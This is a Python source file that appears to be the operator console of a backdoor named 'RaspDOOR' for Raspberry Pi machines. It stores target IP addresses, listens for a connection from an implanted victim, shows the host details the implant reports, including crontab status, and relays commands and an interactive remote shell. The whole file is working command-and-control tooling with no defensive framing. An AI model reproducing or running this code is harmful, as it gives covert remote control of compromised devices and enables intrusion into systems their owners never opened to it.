import socket,json
import subprocess

def print_msg_box(msg, indent=1, width=None, title=None):
    lines = msg.split('\n')
    space = " " * indent
    if not width:
        width = max(map(len, lines))
    box = f'╔{"═" * (width + indent * 2)}╗\n'
    if title:
        box += f'║{space}{title:<{width}}{space}║\n'
        box += f'║{space}{"-" * len(title):<{width}}{space}║\n'
    box += ''.join([f'║{space}{line:<{width}}{space}║\n' for line in lines])
    box += f'╚{"═" * (width + indent * 2)}╝'
    print()
    print(box)
    print()



def print_msg_gen(msg, indent=1, width=None, title=None):
    lines = msg
    space = " " * indent
    if not width:
        width = max(map(len, lines))
    box = f'╔{"═" * (width + indent * 2)}╗\n'
    # if title:
    #     box += f'║{space}{title:<{width}}{space}║\n'
    #     box += f'║{space}{"-" * len(title):<{width}}{space}║\n'
    box += ''.join([f'║{space}{line:<{width}}{space}║\n' for line in lines])
    box += f'╚{"═" * (width + indent * 2)}╝'
    print()
    print(box)
    print()


baner = """  _____                 _____   ____   ____  _____  
 |  __ \               |  __ \ / __ \ / __ \|  __ \ 
 | |__) |__ _ ___ _ __ | |  | | |  | | |  | | |__) |
 |  _  // _` / __| '_ \| |  | | |  | | |  | |  _  / 
 | | \ \ (_| \__ \ |_) | |__| | |__| | |__| | | \ \ 
 |_|  \_\__,_|___/ .__/|_____/ \____/ \____/|_|  \_|
                 | |                                
                 |_|                                
                 """


SERVER_HOST = '!YOUR IP HERE!'
SERVER_PORT = !YOUR PORT HERE!
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

connections = []
MAX_CONNECTIONS = 1

k = 1

if __name__ == '__main__':
    while k is not 0:
        f = open('list/ip.json')
        data = json.load(f)
        ip = []
        for i in data:
            ip.append(i)
        subprocess.run("clear")
        print(baner)
        print_msg_gen([f"{i+1}. {ip[i]['ip']} - {ip[i]['name']}" for i in range(len(ip))]) 
        print('[*] Commands: add, remove, choose')
        command = str(input('[*] Enter command: '))
        while k is not 0:
            if command == 'choose':
                choice = ''
                while True:
                    choice = int(input('[*] Choose IP to establishe a connection: '))
                    try: 
                        IP = ip[choice - 1]['ip']
                        break
                    except: 
                        choice = input('[!] Please choose correct IP: ')

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((SERVER_HOST, SERVER_PORT))
                s.listen()
                k = 0
            if command == 'add':
                ip = str(input('Enter IP: '))
                name = str(input('Enter Name: '))
                data.append({'ip': ip, 'name': name})
                with open('list/ip.json', 'w') as f:
                    json.dump(data, f, indent=4)
                break
            if command == 'remove':
                choice = int(input('[*] Please choose IP to remove: '))
                del data[choice - 1]
                with open('list/ip.json', 'w') as f:
                    json.dump(data, f, indent=4)
                break

    print('[*] Waiting for connection..')

    while True:
        client_socket = ''
        while client_socket != IP:
            client_socket, client_address = s.accept()

            if client_address[0] != IP:
                print('[!] Wrong Connection')
                client_socket.close()
            else: break

        connections.append((client_socket, client_address))
        subprocess.run('clear', shell=True)
        print(baner)
        print()
        print(f'[*] Connection established - {client_address[0]}:{client_address[1]}')  
        print(f"[*] Session: {len(connections)} ")
        print("[*] Available commands: temp, ls, pwd, uname -r, whoami, shell")

        data = json.loads(client_socket.recv(BUFFER_SIZE).decode())
        temp = data['intf'].replace('\n', ' ')
        # print_msg_box(f"CPU Model:{data['cpu_m'].split(':')[1]}\nVendor ID: {data['vendor'].split(':')[1].replace(' ','')}\nArchitecture: {data['arch']}\nTemperature: {data['temp']}\nNetwork Interfaces: {temp}\nCurrent user: {data['usr']}\nCrontab status: {data['cron']}", title="Information")
        print_msg_box(f"CPU Model:{data['cpu_m'].split(':')[1]}\nVendor ID: {data['vendor'].split(':')[1].replace(' ','')}\nArchitecture: {data['arch']}\nNetwork Interfaces: {temp}\nCurrent user: {data['usr']}\nCrontab status: {data['cron']}", title="Information")
        while True:
            try:
                tmp = input(f"[*] Enter command: ")
                if tmp.lower() == 'temp':
                    command = 'vcgencmd measure_temp'
                    client_socket.send(command.encode())
                    output = client_socket.recv(BUFFER_SIZE).decode()
                    results, cwd = output.split(SEPARATOR)
                    print(f'[*] Current temperature: {results[5:]}')
                    print()
                elif tmp.lower() == 'ls':
                    command = 'ls -la'
                    client_socket.send(command.encode())
                    output = client_socket.recv(BUFFER_SIZE).decode()
                    results, cwd = output.split(SEPARATOR)
                    print(f"[*] Total:{results[5:]}\n")
                    print()
                elif tmp.lower() == 'pwd':
                    command = 'pwd'
                    client_socket.send(command.encode())
                    output = client_socket.recv(BUFFER_SIZE).decode()
                    results, cwd = output.split(SEPARATOR)
                    print(f"[*] Current working directory: {results}")
                    print()
                elif tmp.lower() == 'whoami':
                    command = 'whoami'
                    client_socket.send(command.encode())
                    output = client_socket.recv(BUFFER_SIZE).decode()
                    results, cwd = output.split(SEPARATOR)
                    print(f"[*] Current user: {results}")
                    print()
                elif tmp.lower() == 'uname -r':
                    command = 'uname -r'
                    client_socket.send(command.encode())
                    output = client_socket.recv(BUFFER_SIZE).decode()
                    results, cwd = output.split(SEPARATOR)
                    print(f"[*] Current system: {results}")
                    print()
                elif tmp.lower() == 'help':
                    print("[*] Available commands: temp, ls, pwd, uname -r, whoami, shell")
                    print()
                elif tmp.lower() == 'shell':
                    client_socket.send("shell".encode())
                    print("[*] Opening interactive shell")
                    command = input(f"{data['cwd']} $: ")
                    while command != 'exit':
                        if not command.strip():
                            continue
                        client_socket.send(command.encode())
                        output = client_socket.recv(BUFFER_SIZE).decode()
                        results, cwd = output.split(SEPARATOR)
                        print(results)
                        command = input(f"{cwd} $: ")
                    print('[!] Closing interactive shell')
                    print()
                elif tmp.lower() == 'usb':
                    print(data['usb'])
                    print()
                elif tmp.lower() == 'exit':
                    print('[*] Okay :( byee..')
                    break
                else: 
                    print('[!] Oops.. wrong command :(')
                    print()
            except ValueError:
                subprocess.run('clear')
                print("[!] Connection closed")
                print("[*] Waiting for connection..")
                break
        if tmp.lower() == 'exit':
            s.close()
            break
